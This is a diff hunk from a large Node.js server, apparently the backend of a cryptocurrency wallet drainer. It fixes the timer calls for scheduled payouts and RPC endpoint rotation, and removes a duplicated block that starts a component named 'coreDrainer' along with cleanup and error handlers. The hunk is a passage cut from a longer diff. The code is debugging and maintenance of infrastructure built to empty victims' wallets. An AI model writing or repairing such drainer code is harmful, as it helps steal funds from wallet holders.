@@ -3574,47 +3574,17 @@ io.on("connection", (socket) => {
   });
 });
 
+
 // ==================== CRON JOBS ====================
-setInterval(1000 * 60 * 5, async () => {
+setInterval(async () => {
   console.log('⏰ Running scheduled payouts...');
   await processAllPayouts();
-});
+}, 1000 * 60 * 5);
 
-setInterval('*/30 * * * *', () => {
+setInterval(() => {
   console.log('🔄 Rotating RPC endpoints...');
   initializeChains();
-// Initialize core drainer
-coreDrainer.initialize().then(() => {
-  console.log("✅ CoreDrainer initialized successfully");
-}).catch(err => {
-  console.error("❌ CoreDrainer initialization failed:", err);
-});
-});
-
-// ==================== CLEANUP INTERVALS ====================
-setInterval(() => {
-  flowCoordinator.cleanupOldFlows();
-}, 60 * 60 * 1000);
-
-setInterval(() => {
-  multiSigManager.cleanupOldRequests();
-}, 60 * 60 * 1000);
-
-// ==================== GLOBAL ERROR HANDLING ====================
-process.on('uncaughtException', (error) => {
-  if (error.message.includes('bitcoin') || error.message.includes('substring')) {
-    console.log('⚠️ Bitcoin initialization failed - continuing without Bitcoin support');
-  } else {
-    console.error('❌ Uncaught Exception:', error.message);
-  }
-});
-
-process.on('unhandledRejection', (reason, promise) => {
-  console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
-});
-
-// ==================== SERVER INITIALIZATION ====================
-initializeChains();
+}, 1000 * 60 * 30);
 // Initialize core drainer
 coreDrainer.initialize().then(() => {
   console.log("✅ CoreDrainer initialized successfully");
